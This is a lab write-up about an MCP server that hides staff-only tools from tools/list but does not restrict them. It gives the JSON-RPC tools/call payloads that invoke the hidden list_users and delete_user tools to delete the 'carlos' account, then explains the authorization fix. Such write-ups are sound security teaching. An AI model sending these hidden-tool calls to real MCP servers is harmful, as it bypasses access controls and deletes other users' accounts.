# MCP Server Hides Tools Without Restricting Them

## Lab

**Name:** MCP server hides tools without restricting them
**Goal:** Delete the `carlos` account using a hidden MCP tool.

## Authentication

Log in as `wiener`, retrieve the API key from `/my-account`, and use it as the bearer token.

Initialize the MCP server and inspect `tools/list`.

## Find the Hidden Tool

The server instructions reveal that staff accounts can use:

- `list_users`
- `delete_user`

However, `tools/list` does not advertise these tools.

The MCP protocol still allows clients to call them directly by name.

## Exploit

List the hidden staff accounts:

```json
{
  "jsonrpc":"2.0",
  "id":3,
  "method":"tools/call",
  "params": {
    "name": "list_users",
    "arguments": {}
  }
}
```

Delete `carlos`:

```json
{
  "jsonrpc":"2.0",
  "id":4,
  "method":"tools/call",
  "params": {
    "name": "delete_user",
    "arguments": {
      "username": "carlos"
    }
  }
}
```

The response confirms:

```text
Deleted carlos
```

## Why It Works

Removing a tool from `tools/list` is only UI-level filtering. It does not prevent an MCP client from sending a `tools/call` request for that tool.

## Key Takeaway

Authorization must exist in the MCP server's tool dispatcher. Every tool call, including calls to hidden tools, must verify the caller's role and permissions.
